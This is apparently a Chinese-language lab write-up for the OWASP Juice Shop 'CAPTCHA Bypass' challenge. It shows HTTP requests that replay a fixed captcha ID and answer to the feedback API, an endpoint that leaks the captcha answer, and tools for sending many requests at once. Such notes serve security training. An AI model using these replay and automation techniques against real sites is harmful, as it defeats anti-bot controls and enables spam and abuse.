- CAPTCHA Bypass
    - 描述：在20秒内提交10条或更多的客户反馈。
    - 使用客户反馈功能
        - 请求
            ```POST /api/Feedbacks/ HTTP/1.1```
            ```json
            {
                "captchaId": 1,
                "captcha": "13",
                "comment": "a (anonymous)",
                "rating": 2
            }
            ```
    - 提交重复的请求但仍然成功创建反馈，人机验证的编号与答案固定
    - 多次重复通过挑战
    - 其他方法：访问反馈页面时对人机验证的
        - 请求
            ```GET /rest/captcha/ HTTP/1.1```
        - 响应
            ```
            {
                "captchaId": 0,
                "captcha": "8+6-5",
                "answer": "9"
            }
            ```
        - 可设置宏或脚本直接显示人机验证答案
    - 示例解决方案的其他方法：[竞态条件](https://pwning.owasp-juice.shop/companion-guide/latest/appendix/solutions.html#_submit_10_or_more_customer_feedbacks_within_10_seconds)
    示例工具 RaceTheWeb 
    https://github.com/TheHackerDev/race-the-web
        - 也可在 burp 的重复器中克隆标签后设置组发送，或使用增强版攻击器扩展设置多个请求后释放